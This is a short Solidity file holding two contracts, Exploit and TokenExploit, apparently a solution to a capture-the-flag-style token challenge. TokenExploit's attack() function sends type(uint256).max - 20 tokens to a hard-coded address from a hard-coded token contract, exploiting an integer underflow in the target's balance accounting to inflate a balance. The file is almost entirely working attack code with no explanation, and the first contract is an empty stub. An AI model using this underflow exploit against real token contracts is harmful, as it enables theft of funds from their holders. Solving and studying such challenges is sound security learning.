pragma solidity ^0.8.0;

interface Token {
  function transfer(address _to, uint256 _value) external returns (bool);

  function balanceOf(address _owner) external returns (uint256);
}

contract Exploit {
  address eoa = 0xD0CE7E521d26CAc35a7B10d31d6CCc7ffFF8B15e;
  address token = 0x26BB72D927F1fAd5e95077f19Ba15eF5F31EbB79;

  constructor() {}
}

contract TokenExploit {
  address eoa = 0xD0CE7E521d26CAc35a7B10d31d6CCc7ffFF8B15e;
  address token = 0x26BB72D927F1fAd5e95077f19Ba15eF5F31EbB79;

  function attack() public returns (bool, uint256) {
    unchecked {
      bool happened = Token(token).transfer(eoa, type(uint256).max - 20);
      uint256 bal = Token(token).balanceOf(eoa);
      return (happened, bal);
    }
  }
}
